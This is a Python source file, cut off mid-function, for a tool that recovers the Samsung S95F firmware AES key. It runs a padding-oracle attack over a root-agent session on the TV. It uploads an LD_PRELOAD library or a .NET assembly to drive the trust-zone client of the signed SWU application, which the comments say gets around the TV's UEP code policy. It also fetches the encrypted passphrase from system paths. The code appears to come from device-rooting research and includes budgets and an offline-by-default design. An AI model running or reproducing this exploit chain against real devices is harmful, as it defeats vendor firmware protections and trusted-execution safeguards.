#!/usr/bin/env python3
"""Recover the Samsung S95F SWU firmware AES key, offline first.

This tool is the S95F wrapper around the bounded, verified command-0 padding
oracle in ``swu/``.  It adds an offline preparation/verification surface and a
single-session live driver:

  plan      (offline)  validate inputs, record a mode-0600 manifest, show the plan
  status    (offline)  report checkpoint progress without printing key material
  verify    (offline)  AES-256-CBC round trip against a captured firmware section
  fetch     live       pull the 416-byte encrypted passphrase from the TV over sdb
  recover   live       run the bounded oracle inside one archive-root session

Every live subcommand requires an explicit ``--host`` *and* ``--live``; the
default for the tool is offline.  The TV is never contacted by ``plan``,
``status``, ``verify``, ``--help``, or the exit status when nothing remains.

The live driver uses the model-independent archive-root route through
``samsung_tv_root.archive_root.probe`` and ``session_action``.  All oracle
traffic travels over the authenticated root-agent connection: batches are
uploaded with ``write_file``, the preload is launched with ``execute``, and
results are read back with ``read_file``.  No foreground ``qn90f serve``
controller and no sdb push/execute channel are used.

Recovery writes a mode-0600 checkpoint in the same shape the existing
``swu_formatted_passphrase_recover`` tool consumes, so either tool can finish
or re-read the work.  Each live run honours a budget of batches, queries, and
wall-clock seconds and stops cleanly with exit status 2 when it must be resumed.

Typical local preparation (contacts nothing)::

    uv run python tools/recover_s95f_aes.py plan --host 192.0.2.50 \
        --blob ./private/itemsAESPassphraseEncrypted.txt \
        --salt ./private/firmware-salt.bin

Then, with fresh authorization for the TV::

    uv run python tools/recover_s95f_aes.py fetch   --host 192.0.2.50 --live
    uv run python tools/recover_s95f_aes.py recover --host 192.0.2.50 --live
    uv run python tools/recover_s95f_aes.py status
"""

from __future__ import annotations

# ruff: noqa: E402 - the repository root must be importable before project imports.

import argparse
import asyncio
import concurrent.futures
import hashlib
import json
import os
import shlex
import sys
import time
import zlib
from collections.abc import Awaitable, Sequence
from dataclasses import dataclass
from functools import partial
from pathlib import Path, PurePosixPath
from typing import TypeVar

REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
if str(REPOSITORY_ROOT) not in sys.path:
    sys.path.insert(0, str(REPOSITORY_ROOT))

from samsung_tv_root.archive_root import ArchiveRootError, probe
from samsung_tv_root.resources import payload_directory
from samsung_tv_root.root_agent import (
    MAXIMUM_FRAME_BYTES,
    RootAgentConnection,
    RootAgentError,
    RootAgentFile,
)
from samsung_tv_root.sdb import (
    SDB_BRIDGE_PORT,
    SdbClient,
    SdbError,
    find_sdb,
)

from swu.swu_formatted_passphrase_recover import (
    CIPHERTEXT_BLOCKS,
    TRAILING_PADDING_SIZE,
    build_format_options,
    empty_block_state,
    finalize_complete_state,
    load_state,
    relocate_block,
)
from swu.swu_padding_oracle import (
    BLOCK_SIZE,
    CANDIDATE_SIZE,
    RESULT_MAGIC,
    OracleError,
    decode_results,
    encode_batch,
    recover_last_block,
    valid_pkcs7,
    validation_candidates,
    write_private_json,
)

T = TypeVar("T")

TOOL_NAME = "recover_s95f_aes"
MANIFEST_SCHEMA = 1
SALT_SIZE = 8
DEFAULT_WORKDIR = Path.home() / ".samsung-tv-root" / "s95f-aes-recovery"
DEFAULT_BLOB_NAME = "itemsAESPassphraseEncrypted.txt"
DEFAULT_SALT_NAME = "firmware-salt.bin"
DEFAULT_PRELOAD_DIRECTORY = REPOSITORY_ROOT / "swu" / "out"
BATCH_PRELOAD_NAME = "libswu-init-oracle-batch-preload.so"
INTEGRITY_PRELOAD_NAME = "libswu-init-integrity-preload.so"

DEFAULT_REMOTE_BLOB = PurePosixPath(
    "/usr/share/org.tizen.tv.swu/itemsAESPassphraseEncrypted.txt"
)
DEFAULT_REMOTE_BLOB_SUBMODEL = PurePosixPath(
    "/usr/share/org.tizen.tv.swu/itemsSubModelAESPassphraseEncrypted.txt"
)
# The root agent only reads and writes inside its own runtime directory, so all
# oracle staging lives under /run/samsung-tv-root/agent-<pid>/ (a mode-0700
# tmpfs directory the agent removes when it shuts down).
RUNTIME_ROOT = PurePosixPath("/run/samsung-tv-root")
ORACLE_SUBDIRECTORY = "swu-passphrase"
BATCH_PRELOAD_REMOTE_NAME = "libswu-init-oracle-batch-v1.so"
INTEGRITY_PRELOAD_REMOTE_NAME = "libswu-init-integrity-v1.so"
SALT_REMOTE_NAME = "firmware-salt.bin"
BATCH_REMOTE_NAME = "oracle-recovery-batch.bin"
RESULT_REMOTE_NAME = "oracle-recovery-result.bin"
STATUS_REMOTE_NAME = "oracle-recovery-status.txt"
INTEGRITY_CANDIDATE_REMOTE_NAME = "integrity-candidate.bin"
INTEGRITY_STATUS_REMOTE_NAME = "init-integrity-status.txt"
FETCH_STAGING_REMOTE_NAME = "fetch-staging.bin"

# The managed evaluator: a signed dotnet runtime runs this assembly, which
# dlopens the *verified* SWUMainApp and calls its trust-zone client.  No
# uploaded native code is executed, so the TV's UEP policy does not apply.
DOTNET_PATH = "/usr/bin/dotnet"
ORACLE_PAYLOAD_DLL = "SamsungTvSwuOracle.dll"
ORACLE_PAYLOAD_CONFIG = "SamsungTvSwuOracle.runtimeconfig.json"
DEFAULT_PAYLOAD_DIRECTORY = REPOSITORY_ROOT / "payloads" / "common" / "out"
EVALUATORS = ("preload", "payload")
REMOTE_SWU_APPLICATION = "/usr/apps/org.tizen.tv.swu/bin/SWUMainApp"
SWU_APPLICATION_PATH = REMOTE_SWU_APPLICATION
SWU_PASSPHRASE_DIRECTORY = PurePosixPath("/usr/share/org.tizen.tv.swu")
# Tizen's sdb refuses to pull from system paths regardless of file permission.
SDB_PATH_REFUSAL = "cannot pull files from this path"

HEALTH_COMMAND = (
    "/usr/bin/systemctl show security-tzdaemon.service "
    "-p MainPID -p NRestarts -p ActiveState -p SubState --no-pager"
)
SECUREOS_DUMPS_DIRECTORY = "/opt/data/save_error_log/error_log/secureos_dump"
# The dump path is model-specific (this one is the QN90F's).  A missing directory
# means there are no secure-world dumps, so report that explicitly rather than
# failing - while still signalling loudly if one appears during a run.
DUMPS_COMMAND = (
    f"if [ -d {SECUREOS_DUMPS_DIRECTORY} ]; then "
    f"/usr/bin/find {SECUREOS_DUMPS_DIRECTORY} -maxdepth 1 -type f -print; "
    "else /bin/echo __absent__; fi"
)

EXIT_OK = 0
EXIT_ERROR = 1
EXIT_INCOMPLETE = 2

PREFLIGHT_EXPECTED = {"baseline": 1, "first-byte": 1, "final-byte": 0}


class BudgetExhausted(RuntimeError):
    """Raised to stop a live run cleanly when a budget is spent."""


class UsageError(RuntimeError):
    """Raised for a definite command-line or input mistake."""


# --------------------------------------------------------------------------- #
# AES-256-CBC (pure Python, decrypt + encrypt) for offline verification.
# --------------------------------------------------------------------------- #

GF_POLYNOMIAL = 0x1B


def _gf_mul(left: int, right: int) -> int:
    product = 0
    for _ in range(8):
        if right & 1:
            product ^= left
        high_bit = left & 0x80
        left = (left << 1) & 0xFF
        if high_bit:
            left ^= GF_POLYNOMIAL
        right >>= 1
    return product


def _gf_power(value: int, exponent: int) -> int:
    result = 1
    while exponent:
        if exponent & 1:
            result = _gf_mul(result, value)
        value = _gf_mul(value, value)
        exponent >>= 1
    return result


def _rotate_left_byte(value: int, count: int) -> int:
    return ((value << count) | (value >> (8 - count))) & 0xFF


def _build_tables() -> tuple[bytes, bytes]:
    forward = bytearray(256)
    for value in range(256):
        inverse = 0 if value == 0 else _gf_power(value, 254)
        forward[value] = (
            inverse
            ^ _rotate_left_byte(inverse, 1)
            ^ _rotate_left_byte(inverse, 2)
            ^ _rotate_left_byte(inverse, 3)
            ^ _rotate_left_byte(inverse, 4)
            ^ 0x63
        )
    reverse = bytearray(256)
    for value, mapped in enumerate(forward):
        reverse[mapped] = value
    return bytes(forward), bytes(reverse)


SBOX, INVERSE_SBOX = _build_tables()


def _expand_key(key: bytes) -> tuple[list[bytes], int]:
    if len(key) not in (16, 24, 32):
        raise ValueError("AES key must contain 16, 24, or 32 bytes")
    word_count = len(key) // 4
    rounds = word_count + 6
    words = [list(key[4 * index : 4 * index + 4]) for index in range(word_count)]
    round_constant = 1
    for index in range(word_count, 4 * (rounds + 1)):
        temporary = list(words[index - 1])
        if index % word_count == 0:
            temporary = temporary[1:] + temporary[:1]
            temporary = [SBOX[byte] for byte in temporary]
            temporary[0] ^= round_constant
            round_constant = _gf_mul(round_constant, 2)
        elif word_count > 6 and index % word_count == 4:
            temporary = [SBOX[byte] for byte in temporary]
        words.append(
            [
                words[index - word_count][position] ^ temporary[position]
                for position in range(4)
            ]
        )
    round_keys = [
        bytes(byte for word in words[4 * round : 4 * round + 4] for byte in word)
        for round in range(rounds + 1)
    ]
    return round_keys, rounds


def _add_round_key(block: bytearray, round_key: bytes) -> None:
    for index in range(16):
        block[index] ^= round_key[index]


def _shift_rows(block: bytearray) -> None:
    original = bytes(block)
    for row in range(4):
        for column in range(4):
            block[4 * column + row] = original[4 * ((column + row) % 4) + row]


def _inverse_shift_rows(block: bytearray) -> None:
    original = bytes(block)
    for row in range(4):
        for column in range(4):
            block[4 * column + row] = original[4 * ((column - row) % 4) + row]


def _mix_columns(block: bytearray) -> None:
    for column in range(4):
        offset = 4 * column
        first, second, third, fourth = block[offset : offset + 4]
        block[offset] = _gf_mul(first, 2) ^ _gf_mul(second, 3) ^ third ^ fourth
        block[offset + 1] = first ^ _gf_mul(second, 2) ^ _gf_mul(third, 3) ^ fourth
        block[offset + 2] = first ^ second ^ _gf_mul(third, 2) ^ _gf_mul(fourth, 3)
        block[offset + 3] = _gf_mul(first, 3) ^ second ^ third ^ _gf_mul(fourth, 2)


def _inverse_mix_columns(block: bytearray) -> None:
    for column in range(4):
        offset = 4 * column
        first, second, third, fourth = block[offset : offset + 4]
        block[offset] = (
            _gf_mul(first, 14) ^ _gf_mul(second, 11) ^ _gf_mul(third, 13) ^ _gf_mul(fourth, 9)
        )
        block[offset + 1] = (
            _gf_mul(first, 9) ^ _gf_mul(second, 14) ^ _gf_mul(third, 11) ^ _gf_mul(fourth, 13)
        )
        block[offset + 2] = (
            _gf_mul(first, 13) ^ _gf_mul(second, 9) ^ _gf_mul(third, 14) ^ _gf_mul(fourth, 11)
        )
        block[offset + 3] = (
            _gf_mul(first, 11) ^ _gf_mul(second, 13) ^ _gf_mul(third, 9) ^ _gf_mul(fourth, 14)
        )


def _encrypt_block(round_keys: list[bytes], rounds: int, block: bytes) -> bytes:
    state = bytearray(block)
    _add_round_key(state, round_keys[0])
    for round_index in range(1, rounds):
        for index in range(16):
            state[index] = SBOX[state[index]]
        _shift_rows(state)
        _mix_columns(state)
        _add_round_key(state, round_keys[round_index])
    for index in range(16):
        state[index] = SBOX[state[index]]
    _shift_rows(state)
    _add_round_key(state, round_keys[rounds])
    return bytes(state)


def _decrypt_block(round_keys: list[bytes], rounds: int, block: bytes) -> bytes:
    state = bytearray(block)
    _add_round_key(state, round_keys[rounds])
    for round_index in range(rounds - 1, 0, -1):
        _inverse_shift_rows(state)
        for index in range(16):
            state[index] = INVERSE_SBOX[state[index]]
        _add_round_key(state, round_keys[round_index])
        _inverse_mix_columns(state)
    _inverse_shift_rows(state)
    for index in range(16):
        state[index] = INVERSE_SBOX[state[index]]
    _add_round_key(state, round_keys[0])
    return bytes(state)


def _cbc_decrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    if len(iv) != BLOCK_SIZE or len(data) % BLOCK_SIZE:
        raise ValueError("AES-CBC input must be block aligned with a 16-byte IV")
    round_keys, rounds = _expand_key(key)
    output = bytearray()
    previous = iv
    for offset in range(0, len(data), BLOCK_SIZE):
        block = data[offset : offset + BLOCK_SIZE]
        decrypted = _decrypt_block(round_keys, rounds, block)
        output.extend(left ^ right for left, right in zip(decrypted, previous, strict=True))
        previous = block
    return bytes(output)


def _cbc_encrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    if len(iv) != BLOCK_SIZE or len(data) % BLOCK_SIZE:
        raise ValueError("AES-CBC input must be block aligned with a 16-byte IV")
    round_keys, rounds = _expand_key(key)
    output = bytearray()
    previous = iv
    for offset in range(0, len(data), BLOCK_SIZE):
        block = bytes(
            left ^ right
            for left, right in zip(data[offset : offset + BLOCK_SIZE], previous, strict=True)
        )
        encrypted = _encrypt_block(round_keys, rounds, block)
        output.extend(encrypted)
        previous = encrypted
    return bytes(output)


def _pkcs7_pad(data: bytes) -> bytes:
    padding = BLOCK_SIZE - (len(data) % BLOCK_SIZE)
    return data + bytes([padding]) * padding


def _strip_pkcs7(data: bytes) -> bytes:
    if not data or len(data) % BLOCK_SIZE or not valid_pkcs7(data[-BLOCK_SIZE:]):
        raise OracleError("decrypted section does not end in valid PKCS#7 padding")
    padding = data[-1]
    if len(data) < padding:
        raise OracleError("decrypted section padding exceeds the section size")
    return data[:-padding]


def aes_self_test() -> bool:
    """Check the AES core against FIPS-197 known answers and a round trip."""
    vectors = (
        (
            "000102030405060708090a0b0c0d0e0f",
            "00112233445566778899aabbccddeeff",
            "69c4e0d86a7b0430d8cdb78070b4c55a",
        ),
        (
            "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f",
            "00112233445566778899aabbccddeeff",
            "8ea2b7ca516745bfeafc49904b496089",
        ),
    )
    for raw_key, raw_plaintext, raw_ciphertext in vectors:
        key = bytes.fromhex(raw_key)
        plaintext = bytes.fromhex(raw_plaintext)
        ciphertext = bytes.fromhex(raw_ciphertext)
        round_keys, rounds = _expand_key(key)
        if _encrypt_block(round_keys, rounds, plaintext) != ciphertext:
            return False
        if _decrypt_block(round_keys, rounds, ciphertext) != plaintext:
            return False
    key = hashlib.sha256(b"s95f-aes-self-test").digest()
    iv = hashlib.sha256(b"s95f-aes-self-test-iv").digest()[:16]
    payload = bytes(range(256)) * 3 + b"padding"
    if _strip_pkcs7(_cbc_decrypt(key, iv, _cbc_encrypt(key, iv, _pkcs7_pad(payload)))) != payload:
        return False
    return True


# --------------------------------------------------------------------------- #
# Small helpers.
# --------------------------------------------------------------------------- #


def _timestamp() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def sha256_file(path: Path) -> str:
    return sha256_bytes(path.read_bytes())


def short_digest(digest: str, length: int = 16) -> str:
    return digest[:length] + ("…" if len(digest) > length else "")


def parse_status_fields(text: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    for line in text.splitlines():
        name, separator, value = line.partition("=")
        if separator:
            fields[name.strip()] = value.strip()
    return fields


def parse_hex_field(fields: dict[str, str], name: str) -> int | None:
    value = fields.get(name)
    if value is None:
        return None
    try:
        return int(value, 16)
    except ValueError:
        return None


def derive_section_iv(salt: bytes) -> bytes:
    """MSD section IV: SHA-256 of the raw 8-byte section salt, truncated to 16.

    Formula from unixtract's Tizen MSD module (theubusu/unixtract,
    src/formats/msd/mod.rs).  Validated against this package: the S95F
    sign.bin section (salt 3d2d422d5750adfb) decrypts to plaintext whose CRC-32
    matches the value recorded in the package metadata.
    """
    if len(salt) != SALT_SIZE:
        raise ValueError("the section salt must contain exactly 8 bytes")
    return hashlib.sha256(salt).digest()[:BLOCK_SIZE]


def parse_decimal_field(fields: dict[str, str], name: str) -> int | None:
    value = fields.get(name)
    if value is None:
        return None
    try:
        return int(value, 10)
    except ValueError:
        return None


def mutate_byte(data: bytes, index: int, xor: int) -> bytes:
    if not 0 <= index < len(data):
        raise ValueError("mutation index is outside the candidate")
    candidate = bytearray(data)
    candidate[index] ^= xor
    return bytes(candidate)


def environment_command(environment: dict[str, str], executable: str) -> str:
    assignments = " ".join(
        f"{name}={shlex.quote(value)}" for name, value in environment.items()
    )
    return f"/usr/bin/env {assignments} {executable}"


def _pending_blocks(state: dict[str, object], first_block: int, last_block: int) -> list[int]:
    blocks = state["blocks"]
    assert isinstance(blocks, dict)
    pending: list[int] = []
    for block in range(first_block, last_block - 1, -1):
        block_state = blocks.get(str(block), {})
        if (
            isinstance(block_state, dict)
            and block_state.get("complete")
            and block_state.get("validation") == [True, False]
        ):
            continue
        pending.append(block)
    return pending


def _completed_block_count(state: dict[str, object]) -> int:
    blocks = state.get("blocks", {})
    if not isinstance(blocks, dict):
        return 0
    return sum(
        1
        for block in range(CIPHERTEXT_BLOCKS)
        if isinstance(blocks.get(str(block)), dict)
        and blocks[str(block)].get("complete")
        and blocks[str(block)].get("validation") == [True, False]
    )


# --------------------------------------------------------------------------- #
# Paths, manifest, and offline input validation.
# --------------------------------------------------------------------------- #


@dataclass(frozen=True)
class Paths:
    workdir: Path
    blob: Path
    salt: Path
    checkpoint: Path
    manifest: Path
    preload_directory: Path

    @property
    def batch_preload(self) -> Path:
        return self.preload_directory / BATCH_PRELOAD_NAME

    @property
    def integrity_preload(self) -> Path:
        return self.preload_directory / INTEGRITY_PRELOAD_NAME


def resolve_paths(args: argparse.Namespace) -> Paths:
    workdir = Path(args.workdir).expanduser()
    blob = Path(args.blob).expanduser() if args.blob else workdir / DEFAULT_BLOB_NAME
    salt = Path(args.salt).expanduser() if args.salt else workdir / DEFAULT_SALT_NAME
    checkpoint = (
        Path(args.checkpoint).expanduser()
        if args.checkpoint
        else workdir / "checkpoint.json"
    )
    manifest = (
        Path(args.manifest).expanduser() if args.manifest else workdir / "manifest.json"
    )
    preload_directory = (
        Path(args.preload_directory).expanduser()
        if getattr(args, "preload_directory", None)
        else DEFAULT_PRELOAD_DIRECTORY
    )
    return Paths(workdir, blob, salt, checkpoint, manifest, preload_directory)


def prepare_workdir(paths: Paths) -> None:
    paths.workdir.mkdir(parents=True, exist_ok=True)
    os.chmod(paths.workdir, 0o700)


def load_manifest(path: Path) -> dict[str, object]:
    try:
        manifest = json.loads(path.read_text(encoding="utf-8"))
    except FileNotFoundError:
        return {}
    if not isinstance(manifest, dict) or manifest.get("schema") != MANIFEST_SCHEMA:
        raise UsageError(
            f"{path} is not a {TOOL_NAME} schema-{MANIFEST_SCHEMA} manifest; "
            "re-run the plan subcommand"
        )
    return manifest


def save_manifest(path: Path, manifest: dict[str, object]) -> None:
    manifest["schema"] = MANIFEST_SCHEMA
    manifest["tool"] = TOOL_NAME
    manifest["updated_at"] = _timestamp()
    write_private_json(path, manifest)


def read_input_file(path: Path, expected_size: int, label: str) -> bytes:
    try:
        data = path.read_bytes()
    except OSError as error:
        raise UsageError(f"cannot read {label} {path}: {error}") from error
    if len(data) != expected_size:
        raise UsageError(
            f"{label} {path} contains {len(data)} bytes; expected exactly "
            f"{expected_size}"
        )
    return data


def check_preloads(paths: Paths) -> dict[str, dict[str, object]]:
    report: dict[str, dict[str, object]] = {}
    for label, name in (
        ("batch", BATCH_PRELOAD_NAME),
        ("integrity", INTEGRITY_PRELOAD_NAME),
    ):
        path = paths.preload_directory / name
        entry: dict[str, object] = {"path": str(path), "present": path.is_file()}
        if path.is_file():
            entry["bytes"] = path.stat().st_size
            entry["sha256"] = sha256_file(path)
        report[label] = entry
    return report


def offline_prerequisites() -> list[str]:
    """Return human-readable notes for local prerequisites (no TV contact)."""
    notes: list[str] = []
    try:
        sdb = find_sdb()
        notes.append(f"sdb: {sdb}")
    except SdbError as error:
        notes.append(f"sdb: MISSING — {error}")
    if os.environ.get("TVROOT_BRIDGE_TOKEN"):
        notes.append(f"bridge: TVROOT_BRIDGE_TOKEN is set (port {SDB_BRIDGE_PORT})")
    else:
        notes.append("bridge: TVROOT_BRIDGE_TOKEN not set (direct sdb only)")
    payloads = payload_directory("common")
    missing = [
        name
        for name in ("SamsungTvArchiveRoot.dll", "SamsungTvRootAgent.dll")
        if not (payloads / name).is_file()
    ]
    notes.append(
        "archive-root payloads: "
        + ("built" if not missing else f"MISSING {', '.join(missing)} — run make common-payload")
    )
    return notes


# --------------------------------------------------------------------------- #
# Bounded oracle transport over an authenticated archive-root session.
# --------------------------------------------------------------------------- #


@dataclass
class Budget:
    max_batches: int
    max_queries: int
    deadline: float
    batches: int = 0
    queries: int = 0

    def ensure(self, pending_queries: int = 0) -> None:
        if self.max_batches and self.batches >= self.max_batches:
            raise BudgetExhausted(
                f"batch budget reached ({self.batches}/{self.max_batches})"
            )
        if self.max_queries and self.queries + pending_queries > self.max_queries:
            raise BudgetExhausted(
                f"query budget reached ({self.queries}+{pending_queries}"
                f"/{self.max_queries})"
            )
        if time.monotonic() >= self.deadline:
            raise BudgetExhausted("wall-clock deadline reached")

    def note(self, candidates: int) -> None:
        self.batches += 1
        self.queries += candidates


class LoopBridge:
    """Runs coroutines on the session event loop from the recovery worker thread."""

    def __init__(self, loop: asyncio.AbstractEventLoop, timeout: float) -> None:
        self._loop = loop
        self._timeout = timeout

    def run(self, awaitable: Awaitable[T]) -> T:
        future = asyncio.run_coroutine_threadsafe(awaitable, self._loop)
        try:
            return future.result(self._timeout)
        except concurrent.futures.TimeoutError as error:
            future.cancel()
            raise OracleError(
                f"oracle I/O did not finish within {self._timeout:g}s on the root session"
            ) from error


@dataclass(frozen=True)
class PreflightOutcome:
    results: dict[str, dict[str, object]]
    passed: bool

    @property
    def detail(self) -> str:
        parts = []
        for name in ("baseline", "first-byte", "final-byte"):
            entry = self.results.get(name, {})
            observed = entry.get("init_result")
            parts.append(f"{name}={observed}")
        return " ".join(parts)


class RootAgentOracle:
    """Drives the bounded command-0 oracle through a root-agent connection."""

    def __init__(
        self,
        connection: RootAgentConnection,
        *,
        preload: bytes,
        integrity_preload: bytes,
        salt: bytes,
        command_timeout: float,
        budget: Budget,
        batch_size: int,
        evaluator: str = "preload",
        payload_dll: bytes = b"",
        payload_runtimeconfig: bytes = b"",
    ) -> None:
        self.connection = connection
        self.preload = preload
        self.integrity_preload = integrity_preload
        self.salt = salt
        self.command_timeout = command_timeout
        self.budget = budget
        self.batch_size = max(1, min(batch_size, 256))
        if evaluator not in EVALUATORS:
            raise OracleError(f"unknown evaluator {evaluator!r}")
        self.evaluator = evaluator
        self.payload_dll = payload_dll
        self.payload_runtimeconfig = payload_runtimeconfig

    @property
    def payload_dll_path(self) -> PurePosixPath:
        return self.directory / ORACLE_PAYLOAD_DLL

    @property
    def payload_config_path(self) -> PurePosixPath:
        return self.directory / ORACLE_PAYLOAD_CONFIG

    @property
    def directory(self) -> PurePosixPath:
        """The agent's own runtime directory: the only root it will write into."""
        return (
            RUNTIME_ROOT
            / f"agent-{self.connection.identity.pid}"
            / ORACLE_SUBDIRECTORY
        )

    @property
    def preload_path(self) -> PurePosixPath:
        return self.directory / BATCH_PRELOAD_REMOTE_NAME

    @property
    def integrity_preload_path(self) -> PurePosixPath:
        return self.directory / INTEGRITY_PRELOAD_REMOTE_NAME

    @property
    def salt_path(self) -> PurePosixPath:
        return self.directory / SALT_REMOTE_NAME

    @property
    def batch_path(self) -> PurePosixPath:
        return self.directory / BATCH_REMOTE_NAME

    @property
    def result_path(self) -> PurePosixPath:
        return self.directory / RESULT_REMOTE_NAME

    @property
    def status_path(self) -> PurePosixPath:
        return self.directory / STATUS_REMOTE_NAME

    @property
    def integrity_candidate_path(self) -> PurePosixPath:
        return self.directory / INTEGRITY_CANDIDATE_REMOTE_NAME

    @property
    def integrity_status_path(self) -> PurePosixPath:
        return self.directory / INTEGRITY_STATUS_REMOTE_NAME

    async def stage(self) -> None:
        self._require_sizes()
        directory = shlex.quote(str(self.directory))
        try:
            result = await self.connection.execute(
                f"/bin/mkdir -p {directory} && /bin/chmod 0700 {directory}",
                max(self.command_timeout, 15.0),
            )
        except RootAgentError as error:
            raise OracleError(
                f"cannot prepare the staging directory {self.directory}: {error}"
            ) from error
        print(
            f"staging_directory={self.directory} "
            f"mkdir_exit={result.exit_code} timed_out={result.timed_out} "
            f"detail={result.stdout.strip()[:120]!r}",
            flush=True,
        )
        self._require_success(result, "create remote staging directory")
        if self.evaluator == "payload":
            await self.write_remote(self.payload_dll_path, self.payload_dll)
            await self.write_remote(
                self.payload_config_path, self.payload_runtimeconfig
            )
        else:
            await self.write_remote(self.preload_path, self.preload)
            await self.write_remote(self.integrity_preload_path, self.integrity_preload)
        await self.write_remote(self.salt_path, self.salt)
        await self.clear_outputs()

    async def clear_outputs(self) -> None:
        """Remove previous result/status files so a stale answer can never be read.

        A deletion that fails (or times out) aborts: leaving an old result in
        place would let a launch that writes nothing look like a fresh answer.
        """
        for path in (self.result_path, self.status_path, self.integrity_status_path):
            try:
                result = await self.connection.execute(
                    f"/bin/rm -f {shlex.quote(str(path))}",
                    max(self.command_timeout, 15.0),
                )
            except RootAgentError as error:
                raise OracleError(
                    f"cannot clear {path} before launching: {error}"
                ) from error
            if result.timed_out or result.exit_code != 0:
                raise OracleError(
                    f"cannot clear {path} before launching "
                    f"(exit={result.exit_code} timed_out={result.timed_out})"
                )

    async def close(self) -> None:
        try:
            await self.connection.execute(
                f"/bin/rm -rf {shlex.quote(str(self.directory))}",
                max(self.command_timeout, 15.0),
            )
        except RootAgentError:
            pass

    async def health(self) -> str:
        result = await self.connection.execute(HEALTH_COMMAND, 5.0)
        if result.timed_out or result.exit_code != 0:
            raise OracleError("cannot read security-tzdaemon health")
        return result.stdout.strip()

    async def dumps(self) -> str:
        result = await self.connection.execute(DUMPS_COMMAND, 10.0)
        if result.timed_out or result.exit_code != 0:
            raise OracleError("cannot read the secureos dump directory")
        # Sort locally so an unstable remote order cannot look like a change.
        return "\n".join(sorted(result.stdout.splitlines()))

    async def evaluate(self, candidates: list[bytes]) -> list[bool]:
        if not candidates:
            raise OracleError("the oracle was asked to evaluate no candidates")
        if any(len(candidate) != CANDIDATE_SIZE for candidate in candidates):
            raise OracleError("every candidate must contain exactly 416 bytes")
        results: list[bool] = []
        for start in range(0, len(candidates), self.batch_size):
            chunk = candidates[start : start + self.batch_size]
            # The allowance must cover the whole round: a partially evaluated round
            # cannot identify a byte, so the round is skipped rather than truncated.
            self.budget.ensure(len(chunk))
            await self.write_remote(self.batch_path, encode_batch(chunk))
            await self.clear_outputs()
            failure = await self._launch_batch()
            if failure is not None:
                raise OracleError(await self._diagnose_failure(failure, len(chunk)))
            payload = await self.read_remote(self.result_path)
            self.budget.note(len(chunk))
            results.extend(decode_results(payload, len(chunk)))
        return results

    async def write_remote(self, path: PurePosixPath, data: bytes) -> None:
        if len(data) > MAXIMUM_FRAME_BYTES:
            raise OracleError(f"staged file {path} exceeds the frame limit")
        # WRITEFILE opens with FileMode.CreateNew, so a path can only be written
        # once per session unless the previous file is removed first.
        try:
            await self.connection.execute(
                f"/bin/rm -f {shlex.quote(str(path))}",
                max(self.command_timeout, 15.0),
            )
        except RootAgentError as error:
            raise OracleError(
                f"cannot clear {path} before staging: {error}"
            ) from error
        try:
            written = await self.connection.write_file(
                str(path), data, max(self.command_timeout, 30.0)
            )
        except RootAgentError as error:
            raise OracleError(
                f"could not stage {path} ({len(data)} bytes): {error}"
            ) from error
        print(f"staged {path} bytes={written.length}", flush=True)

    async def read_remote(self, path: PurePosixPath) -> bytes:
        try:
            staged: RootAgentFile = await self.connection.read_file(
                str(path), max(self.command_timeout, 30.0)
            )
        except RootAgentError as error:
            raise OracleError(f"could not read {path}: {error}") from error
        return staged.data

    async def _launch_batch(self) -> str | None:
        """Launch the batch evaluator; return a diagnostic string when it fails."""
        if self.evaluator == "payload":
            # The managed evaluator: a signed dotnet runtime runs our assembly,
            # which dlopens the verified SWUMainApp.  No native upload is mapped,
            # so the TV's UEP policy is not involved.
            command = (
                f"{DOTNET_PATH} {shlex.quote(str(self.payload_dll_path))} "
                f"batch {shlex.quote(str(self.batch_path))} "
                f"{shlex.quote(str(self.salt_path))} "
                f"{shlex.quote(str(self.result_path))}"
            )
        else:
            environment = {
                "LD_PRELOAD": str(self.preload_path),
                "SWU_ORACLE_BATCH_PATH": str(self.batch_path),
                "SWU_ORACLE_SALT_PATH": str(self.salt_path),
                "SWU_ORACLE_RESULT_PATH": str(self.result_path),
                "SWU_ORACLE_STATUS_PATH": str(self.status_path),
            }
            command = environment_command(environment, REMOTE_SWU_APPLICATION)
        try:
            result = await self.connection.execute(command, self.command_timeout)
        except RootAgentError as error:
            return f"oracle batch transport failed: {error}"
        if result.timed_out:
            return f"oracle batch exceeded its {self.command_timeout:g}s command timeout"
        if result.exit_code != 0:
            detail = (result.stderr or result.stdout).strip()
            status = await self._read_status_text()
            return (
                "oracle batch failed"
                + (f": {detail}" if detail else "")
                + (f" (status: {status})" if status else "")
            )
        return None

    async def _diagnose_failure(self, failure: str, count: int) -> str:
        """Name a client-open failure when the preload recorded one."""
        try:
            payload = await self.read_remote(self.result_path)
        except OracleError:
            return failure
        header = len(RESULT_MAGIC) + 8
        if payload.startswith(RESULT_MAGIC) and b"\xff" in payload[header:]:
            return (
                f"{failure}; the SWU client reported a client-open failure "
                "(no TEEC session for that candidate)"
            )
        try:
            decode_results(payload, count)
        except OracleError as error:
            return f"{failure}; {error}"
        return failure

    async def _read_status_text(self) -> str:
        try:
            return (
                (await self.read_remote(self.status_path))
                .decode("utf-8", "replace")
                .strip()
            )
        except OracleError:
            return ""

    def _require_sizes(self) -> None:
        if self.evaluator == "payload":
            if len(self.payload_dll) == 0:
                raise OracleError("the oracle payload assembly is empty")
            if len(self.payload_runtimeconfig) == 0:
                raise OracleError("the oracle payload runtime config is empty")
        else:
            if len(self.preload) == 0:
                raise OracleError("the oracle batch preload is empty")
            if len(self.integrity_preload) == 0:
                raise OracleError("the oracle integrity preload is empty")
        if len(self.salt) != SALT_SIZE:
            raise OracleError("the firmware salt must contain exactly 8 bytes")

    @staticmethod
    def _require_success(result: object, description: str) -> None:
        exit_code = getattr(result, "exit_code", None)
        timed_out = getattr(result, "timed_out", None)
        if timed_out or exit_code != 0:
            raise OracleError(f"could not {description} on the TV")


async def run_integrity_preflight(
    oracle: RootAgentOracle,
    blob: bytes,
) -> PreflightOutcome:
    """Establish that the S95F command-0 path is a padding oracle."""
    results: dict[str, dict[str, object]] = {}

    async def probe_case(name: str, candidate: bytes) -> int | None:
        await oracle.write_remote(oracle.integrity_candidate_path, candidate)
        await oracle.clear_outputs()
